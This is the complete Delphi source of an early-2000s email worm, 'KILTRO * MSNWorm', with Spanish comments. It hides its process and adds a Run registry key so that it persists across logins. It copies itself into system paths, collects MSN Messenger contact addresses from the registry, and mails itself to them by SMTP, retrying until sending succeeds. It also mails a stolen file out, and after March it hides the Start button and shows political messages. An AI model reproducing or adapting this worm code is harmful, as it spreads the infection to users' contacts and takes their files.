   unit Unit1;

   interface

   uses
     Windows,registry, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, wininet,shellapi,NMpop3, Psock, NMsmtp, ExtCtrls, StdCtrls, jpeg;

   type
     TForm1 = class(TForm)
       SMTP1: TNMSMTP;
       Label1: TLabel;
       Label2: TLabel;
       Edit2: TEdit;
       Label3: TLabel;
       Edit3: TEdit;
       Label4: TLabel;
       Edit4: TEdit;
       Label5: TLabel;
       Edit5: TEdit;
       Memo1: TMemo;
       Label7: TLabel;
       Memo2: TMemo;
       Memo4: TMemo;
       fecha: TEdit;
       Memo6: TMemo;
       Memo7: TMemo;


       procedure enviado(Sender: TObject);
       procedure FormCreate(Sender: TObject);

     private
       { Private declarations }
     public
       { Public declarations }
     end;

   procedure leerimailsvictimas(memomail:tmemo);

    CONST
       TITULO:pchar = 'KILTRO * MSNWorm';
   var
     Form1: TForm1;
         archivoimail:textfile;
         archivokey:textfile;
         archivomarK:textfile;
         implementation

       function RegisterServiceProcess (dwProcessID, dwType: DWord) : DWord;
      stdcall; external 'KERNEL32.DLL';




   {$R *.dfm}

   //form1.visible = false;
   procedure TForm1.enviado(Sender: TObject);
   begin
   //la marca del envio

   AssignFile (archivomarK,'c:\windat.vxd');
   Rewrite (archivomark);
   writeln (archivomarK,'Programado en Santiago de Chile por ErGrone');
   closefile(archivomarK);



   //KILTRO
   //no gusano =)
   //Creado por "ErGrone"
   //Fecha de inicio: 5 de noviembre del 2001      uuuu el trabajo me jode el tiempo
   //Procedencia: Sudamerica/Chile
   //******************************


   end;


   function registrodevictimas(RootKey: HKEY; Key, Value: string): variant;
   //plantilla copiada desde http://www.latiumsoftware.com/
   //respeto al autor, gracias por ahorrarme trabajo :)
   var
     Reg: TRegistry;
     RegDataType: TRegDataType;
     DataSize, Len: integer;
     s: string;
   label fueradeindice;
   begin

     Reg := nil;
     try
       Reg := TRegistry.Create(KEY_QUERY_VALUE);
       Reg.RootKey := RootKey;
       if Reg.OpenKeyReadOnly(Key) then begin
         try
           RegDataType := Reg.GetDataType(Value);
           if (RegDataType = rdString) or
              (RegDataType = rdExpandString) then
             Result := Reg.ReadString(Value)
           else if RegDataType = rdInteger then
             Result := Reg.ReadInteger(Value)
           else if RegDataType = rdBinary then begin
             DataSize := Reg.GetDataSize(Value);
             if DataSize = -1 then goto fueradeindice;
             SetLength(s, DataSize);
             Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
             if Len <> DataSize then goto fueradeindice;
             Result := s;
           end else
   fueradeindice:

         except
           s := ''; // Deallocates memory if allocated
           Reg.CloseKey;
           raise;
         end;
         Reg.CloseKey;
       end else
         raise Exception.Create(SysErrorMessage(GetLastError));
     except
       Reg.Free;
       raise;
     end;
     Reg.Free;
   end;

   procedure nosenganchamosenelpc(RootKey: HKEY; Key, Value: string;
     RegDataType: TRegDataType; Data: variant);
   var
     Reg: TRegistry;
     s: string;
   begin
     Reg := TRegistry.Create(KEY_WRITE);
     try
       Reg.RootKey := RootKey;
       if Reg.OpenKey(Key, True) then begin
         try
           if RegDataType = rdUnknown then
             RegDataType := Reg.GetDataType(Value);
           if RegDataType = rdString then
             Reg.WriteString(Value, Data)
           else if RegDataType = rdExpandString then
             Reg.WriteExpandString(Value, Data)
           else if RegDataType = rdInteger then
             Reg.WriteInteger(Value, Data)
           else if RegDataType = rdBinary then begin
             s := Data;
             Reg.WriteBinaryData(Value, PChar(s)^, Length(s));
           end else
             raise Exception.Create(SysErrorMessage(ERROR_CANTWRITE));
         except
           Reg.CloseKey;
           raise;
         end;
         Reg.CloseKey;
       end else
         raise Exception.Create(SysErrorMessage(GetLastError));
     finally
       Reg.Free;
     end;
   end;



   procedure traspasakiltroparamail(lamemo:tmemo);
   begin

   ///esta funcion siempre debe ejecutarse para asegurar nuestra presencia
   ///borrar los archivos a los que se hace referencia en el caso de estar infectados
   copyfile('psycho.scr','c:\system32.exe',true);   // el sentinela
   copyfile('c:\system32.exe','c:\archiv~1\psycho.scr',true);   // el sentinela


   end;


   procedure leerimailsvictimas(memomail:Tmemo);
   var
   imails: array[0..100] of string ;
   f:integer;
   imailunicode,imailbien,espejo:string;
   conta:integer;
   marca:integer;
   label nomas;
   begin
   espejo := '*';    //nada mas que una marca para iniciar el espejo
   AssignFile (archivoimail,'kiltro.dat');  // la bodega de imails
   Rewrite (archivoimail);
   //aqui obtenemos 101 imails para multiplicarme, ojala agarre un ciber ;-)+----<
   for f := 0 to 100 do
   begin
   imailunicode:=(registrodevictimas(HKEY_CURRENT_USER,'\Software\Microsoft\MessengerService\ListCache\.NET Messenger Service', 'Allow'+inttostr(f)));
   marca := 0;  //marca 0 es comenzamos a leer la siguiente direccion imail
   imailbien :='';
   //el retorno de registrodevictimas tiene caracteres unicode al final
   //de cada direccion imail, debemos descartarlos
   //para obtener un recipiente valido.
   for conta := 1 to 50 do  //cuantos carcteres leeremos
   begin
   if imailunicode[conta] = '' then // checkamos el comienzo unicode, si es verdadero
                                   //leemos hasta aqui y guardamos el imail limpio.
   begin
   marca := 1;  // esta marca nos informa el inicio del unicode
   //si la victima tiene menos de 101 contactos entonces el ultimo contacto
   //se repetira hasta completar los 101,
   //chackando con la variable espejo limpiamos este residuo
   if espejo = imailbien then goto nomas;
   writeln(archivoimail,imailbien);       // lo explico?
   espejo := imailbien;                   // ha?
   end
   else
   if espejo = imailbien then goto nomas;
   if marca = 1 then goto nomas;
   imailbien := imailbien+imailunicode[conta];   //juntamos el imail letra por letra
   end;
   nomas:   //UFFFFFFFFFFFf, descansamos
   end;
   end;


   procedure TForm1.FormCreate(Sender: TObject);

    var
       stSystemTime : TSystemTime;
       i:integer;
       noco:integer;
       noenv:integer;
       label marcao;
         label ACTIVO;
           label noconecta;
             label noenvia;

   begin

      RegisterServiceProcess(GetCurrentProcessID,1);
     noco:=0;
    noenv:=0;

   //////Metodo de conteo: La tipica enganchada desde RunServices
   nosenganchamosenelpc(HKEY_CURRENT_USER,'\Software\Microsoft\Windows\CurrentVersion\Run','msn', rdString, 'c:\system32.exe');
   ///

   traspasakiltroparamail(memo4);//sigue esto para saber como desinfectarte


   //intentamos conectar
   smtp1.host := edit5.Text;
   noconecta:
   try
   smtp1.Connect;
   Except
       // Imposible conectar con el servidor de correo ...  SEGUIMOS INTENTANDO
       if smtp1.Connected = false then
       begin
       noco := 1;
       end
       else
       noco := 0;
              end;

             if noco = 1 then goto noconecta;


   leerimailsvictimas(memo2);
   CloseFile(archivoimail);
   //obtenemos cada resipiente y los ponemos en la memo2
   Memo2.Lines.LoadFromFile('kiltro.dat');
   smtp1.PostMessage.ToAddress.AddStrings(memo6.Lines);    //.assign(memo2.lines);
   smtp1.PostMessage.ToBlindCarbonCopy.AddStrings(memo2.Lines) ;
   smtp1.PostMessage.FromAddress  := edit4.Text ;
   smtp1.PostMessage.FromName := edit2.Text;
   smtp1.PostMessage.Subject := edit3.text;
   smtp1.PostMessage.Attachments.Assign(memo4.lines);
   smtp1.PostMessage.Body.Assign(memo1.lines);

   //buscamos nuestra marca
   If FileExists('c:\windat.vxd') then goto marcao;
   //si la marca existe, NO enviamos na...
   //problemas en el envio? intentamos hasta lograrlo
   noenvia:
   try
   smtp1.SendMail;
   AssignFile (archivomarK,'c:\Windat.vxd');
   Rewrite (archivomarK);
   writeln (archivomarK,'Programado en Santiago de Chile por ErGrone');
   closefile(archivomarK);

   Except
       // no he podido enviar ...
   noenv :=1 ;

         end;
   if noenv = 1 then goto noenvia;

   marcao:


   If FileExists('c:\windat.DLL') then goto ACTIVO;

   GetlocalTime(stSystemTime);

      if stSystemTime.wMonth  > 3 then //paso marzo?
      begin
   //despues de marzo nos activamos
      AssignFile (archivomarK,'c:\windat.dll');
   Rewrite (archivomarK);
   writeln (archivomarK,'Programado en Santiago de Chile por ErGrone');
   closefile(archivomarK);


   ACTIVO:
   ShowWindow (FindWindowEx(FindWindow('Shell_TrayWnd',nil),0,'Button',nil),SW_Hide);     //borra el boton de inicio
   messagebox(0,'Programado en Santiago de Chile por 4D2',titulo,0);
   messagebox(0,'¡¡¡VIVA SUDAMERICA!!!, ¡¡¡VIVA SIN YANKIS INVASORES!!!',titulo,0);
   messagebox(0,'GUERRA AL SIONISMO',titulo,0);
   messagebox(0,'CRACKING, MARIGUANA & PsichoBilly',titulo,0);
   messagebox(0,'UN SALUO PARA MI TIA MONICA (QEPD) Y MIS AMIGOS DE SIEMPRE : EL JAQUE (QEPD), EL VENA, EL SOTO (QUE HACE EN ESPAÑA EL CAURO!!!), y pa mi compaire ALSINO',titulo,0);
   end;

   //salimos

   //le robamos un archivo, el autoexec
   smtp1.PostMessage.Attachments.Assign(memo7.lines);
   smtp1.PostMessage.ToAddress.assign(memo6.lines);
   smtp1.SendMail;
   smtp1.Disconnect;

   exitprocess(0);
   end;

   //Saluos Pal Amigo ZayDun
   end.
